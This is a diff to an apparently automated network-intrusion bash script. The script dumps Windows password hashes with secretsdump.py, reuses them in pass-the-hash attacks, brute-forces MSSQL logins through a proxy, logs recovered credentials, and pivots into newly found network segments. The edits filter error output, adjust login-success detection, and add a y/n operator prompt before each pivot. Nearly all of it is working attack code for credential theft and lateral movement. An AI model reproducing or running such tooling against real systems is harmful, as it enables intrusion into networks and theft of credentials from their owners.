@@ -147,7 +147,9 @@ pivot_hashdump() {
     local HASH_FILE="$LOOT_SUBDIR/hashes.txt"
 
     secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
-        "${PUSER}@${HOST}" 2>&1 | tee "$HASH_FILE"
+        "${PUSER}@${HOST}" 2>&1 | \
+	grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
+	tee "$HASH_FILE"
 
     if grep -q ":::" "$HASH_FILE" 2>/dev/null; then
         echo "[+]   Hashes extracted and saved to $HASH_FILE"
@@ -439,7 +441,7 @@ attack_new_segment() {
                     echo -ne "\r[*]   Attempt $ATTEMPT: $USER:$PASS ...          "
                     local RESULT
                     RESULT=$(timeout 15 bash -c "printf 'exit\n' | mssqlclient '${USER}:${PASS}@${PIVOT_REACHABLE_IP}' -port '$PROXY_PORT' 2>&1")
-                    if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press help"; then
+                    if echo "$RESULT" | grep -qi "ENVCHANGE\|ACK:\|Press help"; then
                         echo -e "\r[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT (via proxy)          "
                         echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS" >> "$CREDS_FILE"
                         echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS:proxy:${PIVOT_REACHABLE_IP}:${PROXY_PORT}" \
@@ -560,9 +562,16 @@ done < "$CREDS_FILE"
 # Attack any new segments found
 for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
     IFS='|' read -r PIVOT_HOST PIVOT_REACH_IP PIVOT_SEG_IP <<< "${SEGMENT_PIVOT_MAP[$CIDR]}"
-    attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR" "$PIVOT_SEG_IP"
+    echo ""
+    echo "[!] New network segment discovered: $CIDR"
+    echo "[!] Reachable via $PIVOT_HOST (segment IP: $PIVOT_SEG_IP)"
+    read -p "[?] Pivot into $CIDR? (y/n): " PIVOT_CONFIRM
+    if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
+        attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR" "$PIVOT_SEG_IP"
+    else
+        echo "[*] Skipping $CIDR per operator decision."
+    fi
 done
-
 
 # Phase 1: Pass-the-Hash against all live hosts (same-segment)
 
@@ -591,7 +600,7 @@ else
                 PTH_LOG="$PIVOT_DIR/${SAFE_HOST}_pth.txt"
 
                 # Refresh hash list each round
-                HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)
+                HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
 
                 while IFS= read -r HLINE; do
                     NTHASH=$(echo "$HLINE" | cut -d: -f4)
@@ -626,7 +635,12 @@ else
                             echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
                             echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
                             echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
-                            attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
+                            read -p "[?] Pivot into $CIDR_RANGE? (y/n): " PIVOT_CONFIRM
+                            if [[ "$PIVOT_CONFIRM" =~ ^[Yy] ]]; then
+                                attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
+                            else
+                                echo "[*] Skipping $CIDR_RANGE per operator decision."
+                            fi
                         done < <(parse_networks_from_ipconfig "$IPCONFIG")
 
                         break
